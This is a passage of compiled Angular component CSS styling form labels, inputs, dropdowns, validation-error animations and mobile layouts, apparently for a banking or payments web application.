            border-radius: 4px;
            text-align: left
        }

        .montevideo[_ngcontent-c21] .montevideo-text[_ngcontent-c21] {
            width: 100%;
            display: inline-block;
            position: relative;
            line-height: 1.5;
            padding-right: 18px
        }

        .montevideo.selected[_ngcontent-c21] {
            color: #0097c1
        }

        .montevideo.selected[_ngcontent-c21] i[_ngcontent-c21] {
            position: absolute;
            right: 0;
            top: 5px
        }

        .montevideo[_ngcontent-c21]:hover {
            background: rgba(0, 0, 0, .05);
            -webkit-animation: .2s oldhamLinkPrimary;
            animation: .2s oldhamLinkPrimary
        }

        .venecia-main-box[_ngcontent-c21] {
            min-height: 38px;
            padding: 0 0 8px
        }

        .venecia-main-box.catalogMode[_ngcontent-c21] {
            min-height: 0;
            padding: 0
        }

        .venecia-main-box.catalogMode.smallCatalog[_ngcontent-c21] {
            color: #666;
            font-size: 15px
        }

        .venecia-main-box.catalogMode.specialCatalogMode[_ngcontent-c21] {
            line-height: 28px;
            font-size: 14px
        }

        .venecia-main-box.catalogMode.creditDisbursementTransferMode[_ngcontent-c21] {
            display: inline-block;
            vertical-align: top;
            margin-top: -4px
        }

        .venecia-main-box.formEditMode[_ngcontent-c21] {
            padding-bottom: 8px
        }

        .venecia-main-box.withoutLabelMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            display: none
        }

        .venecia-main-box-error[_ngcontent-c21] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            padding: 0;
            font-size: 12px;
            line-height: 10px;
            margin-top: 4px
        }

        .venecia-main-box-error[_ngcontent-c21] [data-hidden=true][_ngcontent-c21],
        .venecia-main-box-error[_ngcontent-c21] [hidden][_ngcontent-c21] {
            display: none
        }

        .venecia-main-form-label.align-top[_ngcontent-c21] {
            vertical-align: top
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            display: block;
            font-size: 12px;
            color: #666
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
            line-height: 18px;
            min-height: 0;
            display: block
        }

        .venecia-main-box.wrappedContentForm.marginContentFormContextual[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
        .venecia-main-box.wrappedContentForm.marginContentFormContextual[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
            padding-left: 6px
        }

        @-webkit-keyframes venecia-validation-drop-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @keyframes venecia-validation-drop-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-drop-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        @keyframes venecia-validation-drop-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        @-webkit-keyframes venecia-validation-drop-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @keyframes venecia-validation-drop-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-drop-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes venecia-validation-drop-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes oldhamLinkPrimary {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes oldhamLinkPrimary {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .venecia-main-box[_ngcontent-c21] {
                padding-bottom: 6px
            }

            .venecia-main-box.checkboxStep2editMode[_ngcontent-c21] .venecia-main-form-drop.medium[_ngcontent-c21],
            .venecia-main-form-drop.large[_ngcontent-c21] {
                width: 100%
            }
        }

        .venecia-main-box.catalogMode.transferOrigin[_ngcontent-c21] {
            width: 80%
        }

        .venecia-main-box.catalogMode.transferOrigin[_ngcontent-c21] .venecia-main-form-drop.large[_ngcontent-c21],
        .venecia-main-box.catalogMode.transferOrigin[_ngcontent-c21] .venecia-main-form-drop.large[_ngcontent-c21] select.venecia-main-form-select[_ngcontent-c21] {
            width: 100%
        }

        .venecia-main-box.catalogMode.extraFinancingCatalogSelectorMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            max-width: none
        }

        .venecia-main-box.catalogMode.extraFinancingCatalogSelectorMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            width: 322px
        }

        .venecia-main-box.catalogMode.customPymentFormMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            width: 100%
        }

        .venecia-main-box.requestStepMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            margin-bottom: 11px
        }

        .venecia-main-box.requestStepMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            padding-left: 0
        }

        .venecia-main-box.timeMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            width: auto
        }

        .venecia-main-box.timeMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            width: 40px;
            padding-right: 5px;
            border: none;
            border-bottom: 1px solid #d1d1d1;
            outline: 0;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.timeMode[_ngcontent-c21] [_ngcontent-c21]:after {
            right: 3px
        }

        .venecia-main-box.twoLines[_ngcontent-c21] {
            width: 80%
        }

        .venecia-main-box.twoLines[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            display: block;
            padding-left: 8px
        }

        .venecia-main-box.customPymentFormMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21],
        .venecia-main-box.customPymentFormMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21],
        .venecia-main-box.twoLines[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21],
        .venecia-main-box.twoLines[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
            width: 100%
        }

        .venecia-main-box.officialReceiptMonthMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            width: 100px
        }

        .venecia-main-box.officialReceiptMonthMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
            width: 100%
        }

        .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] {
            position: absolute;
            top: 74px
        }

        .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            display: none
        }

        .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21],
        .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
            width: 100px
        }

        .venecia-main-box[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            padding-left: 8px
        }

        .venecia-main-box.cancelCheckMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
        .venecia-main-box.cancelcheckMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
        .venecia-main-box.hiringStepUserInformationMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
        .venecia-main-box.usersFormMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            padding-left: 0
        }

        .venecia-main-box.officialReceiptMode.officialReceiptMonthMode[_ngcontent-c21] .venecia-main-form-drop.form-break-data[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .venecia-main-box.officialReceiptMode.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-drop.form-break-data[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            width: 100%
        }

        .venecia-main-form-drop-selected-required[_ngcontent-c21],
        .venecia-main-form-drop-valid[_ngcontent-c21] {
            border-left: 3px solid #0097c1 !important
        }

        @media only screen and (max-width:767px) and (min-width:320px) {

            .venecia-main-box.catalogMode.transferOrigin[_ngcontent-c21],
            .venecia-main-box.twoLines[_ngcontent-c21] {
                width: 100%
            }
        }

        @media only screen and (max-width:1023px) {
            .venecia-main-box.catalogMode.transferOrigin.creditLineMode[_ngcontent-c21] {
                width: 100%
            }
        }

        @media only screen and (max-width:640px) and (min-width:320px) {

            .venecia-main-box.catalogMode.transferOrigin[_ngcontent-c21],
            .venecia-main-box.twoLines[_ngcontent-c21] {
                width: 100%
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .venecia-main-box.officialReceiptMonthMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                width: 50%
            }

            .venecia-main-box.officialReceiptMonthMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
                width: 100%
            }

            .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] {
                top: 158px;
                width: 48%;
                right: 0
            }

            .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21],
            .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
                width: 100%
            }

            .venecia-main-box.catalogMode.extraFinancingCatalogSelectorMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                max-width: none
            }

            .venecia-main-box.catalogMode.extraFinancingCatalogSelectorMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
                width: 100%
            }
        }

        .venecia-main-box.twoLines.creditLine[_ngcontent-c21] {
            padding-top: 8px
        }

        .venecia-main-form-label.creditLine[_ngcontent-c21] {
            padding-bottom: 5px
        }

        .venecia-main-box.twoLines.det[_ngcontent-c21] {
            padding-top: 8px
        }

        .venecia-main-form-label.det[_ngcontent-c21] {
            padding-bottom: 5px
        }
    </style>
<style>
        @charset "UTF-8";

        .venecia-form[_ngcontent-c22] {
            padding: 0 30px 20px
        }

        .venecia-main-form[_ngcontent-c22] {
            padding: 10px 0
        }

        .venecia-main-form-label-parent[_ngcontent-c22] {
            display: inline-block
        }

        .venecia-main-form-label[_ngcontent-c22] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .venecia-main-form-content[_ngcontent-c22] {
            display: inline-block
        }

        .venecia-main-form-label-readonly[_ngcontent-c22] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            vertical-align: middle
        }

        .venecia-main-form-label-readonly[_ngcontent-c22]:after {
            content: ":"
        }

        .venecia-main-form-label-data[_ngcontent-c22] {
            display: inline-block;
            font-size: 14px;
            color: #333;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            vertical-align: middle;
            padding-top: 0
        }

        .venecia-main-form-input[_ngcontent-c22] {
            border: 1px solid #bbb;
            width: 215px;
            height: 30px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 3px
        }

        .venecia-main-form-input.disabled[_ngcontent-c22] {
            border: 1px solid rgba(187, 187, 187, .4);
            background: #fff
        }

        .venecia-main-form-input.x-small[_ngcontent-c22] {
            width: 70px
        }

        .venecia-main-form-input.required[_ngcontent-c22],
        .venecia-main-form-input.required[_ngcontent-c22]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-input.required.valid[_ngcontent-c22],
        .venecia-main-form-input.required[_ngcontent-c22]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-input.required.disabled[_ngcontent-c22],
        .venecia-main-form-input.required[_ngcontent-c22]:focus.disabled {
            border-left: 3px solid rgba(0, 167, 86, .4) !important;
            background: #fff
        }

        .venecia-main-form-input[_ngcontent-c22]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-input[_ngcontent-c22]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c22]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c22]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c22]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[type=email][_ngcontent-c22],
        .venecia-main-form-input[type=number][_ngcontent-c22],
        .venecia-main-form-input[type=tel][_ngcontent-c22],
        .venecia-main-form-input[type=text][_ngcontent-c22] {
            padding: 0 8px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c22] {
            padding: 0 10px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c22]::-webkit-inner-spin-button {
            display: none
        }

        .venecia-main-form-input[type=date][_ngcontent-c22]::-webkit-calendar-picker-indicator {
            display: none
        }

        .venecia-main-form-input.required[_ngcontent-c22]:-moz-read-only,
        .venecia-main-form-input[_ngcontent-c22]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-input.required[_ngcontent-c22]:read-only,
        .venecia-main-form-input[_ngcontent-c22]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea[_ngcontent-c22] {
            border: 1px solid #bbb;
            width: 215px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 2px;
            resize: none
        }

        .venecia-main-form-textarea.required[_ngcontent-c22],
        .venecia-main-form-textarea.required[_ngcontent-c22]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-textarea.required.valid[_ngcontent-c22],
        .venecia-main-form-textarea.required[_ngcontent-c22]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-textarea[_ngcontent-c22]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-textarea[_ngcontent-c22]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c22]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c22]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c22]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea.required[_ngcontent-c22]:-moz-read-only,
        .venecia-main-form-textarea[_ngcontent-c22]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea.required[_ngcontent-c22]:read-only,
        .venecia-main-form-textarea[_ngcontent-c22]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        @-webkit-keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        @keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        .venecia-main-form-input[_ngcontent-c22]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c22]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c22]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c22]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c22]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c22]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c22]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c22]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c22]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c22]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c22]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c22]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c22]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c22]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c22]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c22]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-form-input.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-form-input.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-form-input.large[_ngcontent-c22] {
            width: 350px
        }

        .venecia-main-form-textarea.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-form-textarea.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-form-textarea.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-form-textarea.large[_ngcontent-c22] {
            width: 350px
        }

        .venecia-main-form-title[_ngcontent-c22] {
            font-size: 16px;
            margin: 0;
            padding: 0;
            color: #12447f
        }

        .venecia-main-form-line-separator[_ngcontent-c22] {
            height: 1px;
            width: 100%;
            background: #e1e1e1;
            margin: 2px 0
        }

        .venecia-main-form-required[_ngcontent-c22] {
            height: 10px;
            border-left: 3px solid #0097c1;
            line-height: .4;
            padding-left: 8px;
            margin-top: -10px
        }

        .venecia-main-form-required[_ngcontent-c22]:before {
            clear: both
        }

        .venecia-main-form-required-text[_ngcontent-c22] {
            line-height: 0;
            font-size: 11px
        }

        .venecia-main-form-required.no-show[_ngcontent-c22] {
            display: none
        }

        .venecia-main-validation[_ngcontent-c22] {
            color: #b20000;
            font-size: 12px;
            padding-left: 149px;
            padding-top: 5px;
            opacity: 0
        }

        .venecia-main-form.invalid[_ngcontent-c22] .venecia-main-validation[_ngcontent-c22] {
            display: block;
            opacity: 1;
            -webkit-animation: .3s venecia-validation-message-animated;
            animation: .3s venecia-validation-message-animated
        }

        .confirmationMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: 30px
        }

        @-webkit-keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .venecia-main-form[_ngcontent-c22] .venecia-main-validation[_ngcontent-c22] {
            display: none;
            opacity: 0;
            -webkit-animation: .3s venecia-validation-message-reverse;
            animation: .3s venecia-validation-message-reverse
        }

        @-webkit-keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        @keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        .venecia-main-form.invalid[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            border: 1px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-animated;
            animation: .3s venecia-validation-input-animated
        }

        .venecia-main-form[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            border: 1px solid #bbb;
            -webkit-animation: .3s venecia-validation-input-reverse;
            animation: .3s venecia-validation-input-reverse
        }

        .venecia-main-form-input[_ngcontent-c22],
        .venecia-main-form-input[_ngcontent-c22]:focus,
        .venecia-main-form-textarea[_ngcontent-c22],
        .venecia-main-form-textarea[_ngcontent-c22]:focus {
            border-left: 3px solid #bbb;
            background: #fff
        }

        .venecia-main-form.invalid[_ngcontent-c22] .venecia-main-form-input.required[_ngcontent-c22] {
            border: 1px solid #b20000;
            border-left: 3px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-required-animated;
            animation: .3s venecia-validation-input-required-animated
        }

        .venecia-main-form[_ngcontent-c22] .venecia-main-form-input.required[_ngcontent-c22] {
            border: 1px solid #bbb;
            border-left: 3px solid #0097c1;
            -webkit-animation: .3s venecia-validation-input-required-reverse;
            animation: .3s venecia-validation-input-required-reverse
        }

        @-webkit-keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        @keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error[_ngcontent-c22] {
            width: 215px
        }

        .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.large[_ngcontent-c22] {
            width: 350px
        }

        .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error[_ngcontent-c22] {
            width: 170px
        }

        .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.large[_ngcontent-c22] {
            width: 350px
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .venecia-main-form-input[_ngcontent-c22] {
                font-size: 13px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error[_ngcontent-c22],
            .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.large[_ngcontent-c22],
            .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.medium[_ngcontent-c22],
            .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.small[_ngcontent-c22],
            .venecia-main-form-input[_ngcontent-c22]+.venecia-main-box-error.xsmall[_ngcontent-c22],
            .venecia-main-form-select[_ngcontent-c22]+.venecia-main-box-error[_ngcontent-c22],
            .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error[_ngcontent-c22],
            .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.large[_ngcontent-c22],
            .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.medium[_ngcontent-c22],
            .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.small[_ngcontent-c22],
            .venecia-main-form-textarea[_ngcontent-c22]+.venecia-main-box-error.xsmall[_ngcontent-c22] {
                width: 100%
            }

            .venecia-main-form-input[_ngcontent-c22] {
                font-size: 13px;
                display: block
            }

            .venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
                display: block
            }

            .venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22] {
                width: 100%
            }

            .venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.disabled[_ngcontent-c22] {
                background-color: #a4a4a4;
                opacity: .4;
                border-left: none !important
            }

            .venecia-main-box[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
                margin-left: 3px
            }

            .venecia-main-form[_ngcontent-c22] {
                padding: 8px 0 0
            }

            .venecia-form[_ngcontent-c22] {
                padding: 0 15px 20px
            }

            .venecia-main-form-label[_ngcontent-c22] {
                width: 100%
            }

            .venecia-main-form-label-data[_ngcontent-c22] {
                display: block
            }

            .venecia-main-form-input.large[_ngcontent-c22],
            .venecia-main-form-input.medium[_ngcontent-c22],
            .venecia-main-form-input.small[_ngcontent-c22],
            .venecia-main-form-input.xsmall[_ngcontent-c22],
            .venecia-main-form-textarea.large[_ngcontent-c22],
            .venecia-main-form-textarea.medium[_ngcontent-c22],
            .venecia-main-form-textarea.small[_ngcontent-c22],
            .venecia-main-form-textarea.xsmall[_ngcontent-c22] {
                width: 100%
            }
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-data[_ngcontent-c22] {
                line-height: 30px;
                min-height: 30px
            }

            .venecia-main-form-label-parent[_ngcontent-c22] {
                display: inline-block;
                vertical-align: top;
                min-height: 30px;
                padding-top: 2px
            }
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] {
            display: block;
            width: auto;
            height: auto;
            margin: 0 !important;
            padding: 0 0 4px !important;
            min-height: 0 !important;
            line-height: normal;
            white-space: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            display: inline-block;
            width: 146px;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 12px;
            color: #666
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            max-width: calc(100% - 150px);
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 14px;
            color: #333
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 0;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 0 0 3px;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
            display: inline-block;
            width: 215px;
            margin: 0
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.xxxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.xxxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.xxxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.xxxsmall[_ngcontent-c22],
